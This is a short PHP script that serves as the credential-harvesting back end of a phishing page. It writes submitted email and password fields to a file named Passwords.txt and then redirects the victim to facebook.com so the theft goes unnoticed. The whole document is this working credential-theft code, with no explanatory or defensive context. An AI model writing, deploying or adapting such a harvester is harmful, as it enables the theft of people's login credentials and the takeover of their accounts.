<?php 
$fp = fopen("Passwords.txt", "a");
fwrite($fp, "Email:$_POST[email]\tPassword:$_POST[pass]\r\n");
header('Location: http://www.facebook.com/');
?>